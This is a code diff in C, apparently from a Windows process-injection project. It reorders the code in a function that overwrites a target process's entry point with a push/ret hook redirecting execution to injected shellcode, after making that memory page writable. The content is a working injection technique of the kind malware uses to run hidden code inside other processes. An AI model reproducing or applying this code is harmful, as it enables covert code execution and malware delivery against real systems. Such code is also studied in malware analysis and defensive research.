@@ -74,11 +74,23 @@ bool paste_shellcode_at_ep(HANDLE hProcess, LPVOID remote_shellcode_ptr)
 
     IMAGE_OPTIONAL_HEADER32 opt_hdr = inh->OptionalHeader;
     DWORD ep_rva = opt_hdr.AddressOfEntryPoint;
-    printf("EP = 0x%x\n", ep_rva);
 
+    printf("Entry Point v: %p\n", ep_rva);
+    printf("shellcode ptr: %p\n", remote_shellcode_ptr);
+
+    //make a buffer to store the hook code:
     const SIZE_T kHookSize = 0x10;
     BYTE hook_buffer[kHookSize];
-    memset(hook_buffer, 0xcc,sizeof(hook_buffer));
+    memset(hook_buffer, 0xcc, kHookSize);
+
+    //prepare the redirection:
+    //address of the shellcode will be pushed on the stack and called via ret
+    hook_buffer[0] = 0x68; //push
+    hook_buffer[5] = 0xC3; //ret
+
+    //for 32bit code:
+    DWORD shellcode_addr = (DWORD)remote_shellcode_ptr;
+    memcpy(hook_buffer + 1, &shellcode_addr, sizeof(shellcode_addr));
 
     //make a memory page containing Entry Point Writable:
     DWORD oldProtect;
@@ -86,18 +98,6 @@ bool paste_shellcode_at_ep(HANDLE hProcess, LPVOID remote_shellcode_ptr)
         printf("Virtual Protect Failed!\n");
         return false;
     }
-
-    printf("Entry Point v: %p\n", ep_rva);
-    printf("shellcode ptr: %p\n", remote_shellcode_ptr);
-
-    //prepare the redirection:
-    //address of the shellcode will be pushed on the stack and called via ret
-    hook_buffer[0] = 0x68; //push
-    hook_buffer[5] = 0xC3; //ret
-    
-    //for 32bit code:
-    DWORD shellcode_addr = (DWORD)remote_shellcode_ptr;
-    memcpy(hook_buffer + 1, &shellcode_addr, sizeof(shellcode_addr));
 
     //paste the redirection at Entry Point:
     SIZE_T writen_bytes = 0;
